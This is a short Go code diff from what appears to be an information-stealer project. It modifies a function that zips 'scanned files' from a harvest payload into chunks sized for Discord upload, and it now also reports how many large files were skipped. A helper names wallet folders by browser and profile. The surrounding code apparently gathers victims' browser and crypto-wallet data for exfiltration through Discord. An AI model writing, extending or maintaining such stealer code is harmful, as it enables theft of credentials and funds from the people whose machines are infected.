@@ -70,15 +70,16 @@ func buildPrimaryZipChunks(p *harvestPayload) ([][]byte, error) {
 	return zipArchiveEntriesChunked(entries, maxDiscordUpload)
 }
 
-func buildScannedFilesZipChunks(p *harvestPayload) ([][]byte, error) {
-	entries := buildScannedFileEntries(p)
+func buildScannedFilesZipChunks(p *harvestPayload) ([][]byte, int, error) {
+	entries, skippedLarge := buildScannedFileEntries(p)
 	if len(entries) == 0 {
-		return nil, nil
+		return nil, skippedLarge, nil
 	}
 	sort.Slice(entries, func(i, j int) bool {
 		return entries[i].zipPath < entries[j].zipPath
 	})
-	return zipArchiveEntriesChunked(entries, maxDiscordUpload)
+	chunks, err := zipArchiveEntriesChunked(entries, maxDiscordUpload)
+	return chunks, skippedLarge, err
 }
 
 func walletFolderName(walletName, browser, profile string) string {
